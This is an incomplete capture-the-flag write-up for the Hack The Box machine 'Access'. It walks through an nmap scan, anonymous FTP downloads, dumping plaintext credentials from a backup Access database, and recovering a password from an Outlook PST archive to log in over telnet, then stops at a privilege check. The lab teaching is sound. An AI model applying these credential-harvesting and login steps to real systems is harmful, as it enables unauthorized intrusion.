## Author: 0xClumzZy

### Machine: ACCESS(vip)

### OS: WINDOWS

### LEVEL: EASY

Add the ip to hosts 

```bash
echo "<ip>     access.htb" | sudo tee -a /etc/hosts
```

###### RECON

1. Get tools

| tools |
| ----- |
| lynx  |
| nmap  |

```bash
sudo pacman -Sy --noconfirm nmap rustscan 
```

2. all port scan 

```bash
sudo nmap -sCV --min-rate 5000 access.htb -oA access
```

> PORT   STATE SERVICE VERSION
> 21/tcp open  ftp     Microsoft ftpd
> | ftp-anon: Anonymous FTP login allowed (FTP code 230)
> |_Can't get directory listing: PASV failed: 425 Cannot open data connection.
> | ftp-syst: 
> |_  SYST: Windows_NT
> 23/tcp open  telnet  Microsoft Windows XP telnetd
> | telnet-ntlm-info: 
> |   Target_Name: ACCESS
> |   NetBIOS_Domain_Name: ACCESS
> |   NetBIOS_Computer_Name: ACCESS
> |   DNS_Domain_Name: ACCESS
> |   DNS_Computer_Name: ACCESS
> |_  Product_Version: 6.1.7600
> 80/tcp open  http    Microsoft IIS httpd 7.5
> |_http-server-header: Microsoft-IIS/7.5
> | http-methods: 
> |_  Potentially risky methods: TRACE
> |_http-title: MegaCorp
> Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
> 
> Host script results:
> |_clock-skew: -16s

**Anonymous ftp login **

1. get tooling 

```bash
sudo pacman -Sy --noconfirm inetutils 
```

2. login to confirm 

```bash
ftp anonymous@access.htb 
bye
```

3. get  all files availabe 

```bash
wget -m --no-passive ftp://anonymous:@access.htb/
```

- should see a dir `access.htb`

Found too files 

- @`access.htb/Backups/backup.mdb` was a Microsoft access database file 

- @`acess.htb/Engineer/'Access Control.zip'` was a zip file 

<u>THE DB FILE </u>

- get tooling 

| tools       | use                        |
| ----------- | -------------------------- |
| mdbtools    | for inspecting the db file |
| unzip /7zip | extracting the zip         |

```bash
sudo paru Sy --noconfirm mdbtools
```

Microsoft Access database

Dump the tables 

```bash
 mdb-tables backup.mdb | grep user
```

`auth_user `  seems promising, dump it 

```bash
mdb-export backup.mdb auth_user
```

| username     | pass              |
| ------------ | ----------------- |
| admin        | admin             |
| engineer     | access4u@security |
| backup_admin | admin             |

<u>THE ZIP </u>

- unzip is most likely pre installed 

```bash
sudo pacman -Sy --noconfirm unzip 7zip
```

1. Extract the zip 

```bash
7z x 'Access Control.zip'
```

- unzip returneed an error but 7zip succeed, pass is above 

- file `'Access Control.pst'` extracted 
2. Check what it is 

```bash
file 'Access Control.pst'
```

> Access Control.pst: Microsoft Outlook Personal Storage (>=2003, Unicode, version 23), dwReserved1=0x234, dwReserved2=0x22f3a, bidUnused=0000000000000000, dwUnique=0x39, 271360 bytes, bCryptMethod=1, CRC32 0x744a1e2e

Microsoft Outlook Personal Storage Table

- It's an email archive

- **Format:** Outlook PST (Unicode, Outlook 2003+)

- **Size:** 271,360 bytes (~265 KB)

- **Encryption:** `bCryptMethod=1` → Compressible encryption (weak, not password encryption by itself)

- **CRC32:** Integrity checksum

INSPECTION     

get tools 

```bash
sudo pacman -Sy libpst --noconfirm 
```

1. List the mails 

```bash
lspst "Access Control.pst"
```

> Email    From: john@megacorp.com    Subject: MegaCorp Access Control System "security" account 

2. extract the mail 

```bash
mkdir ouput 
readpst -o output "Access Control.pst"
```

> Opening PST file and indexes...
> Processing Folder "Deleted Items"
>     "Access Control" - 2 items done, 0 items skipped.

3. read the email 

```bash
bat 'Access Control.mbox'
```

> The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers

`security:4Cc3ssC0ntr0ller``

- Check the web, theres nothing

- check telnet 

```bash
sudo telnet access.htb 23
```

> username: security 
> 
> password  4Cc3ssC0ntr0ller 

Move to desktop 

```bash
cd Desktop
```

get user flag 

get privs

```bash
whoami /priv 
```

> Privilege Name                Description                    State
> =============================
> 
> SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
> SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

WE STOP HERE FOR NOW 
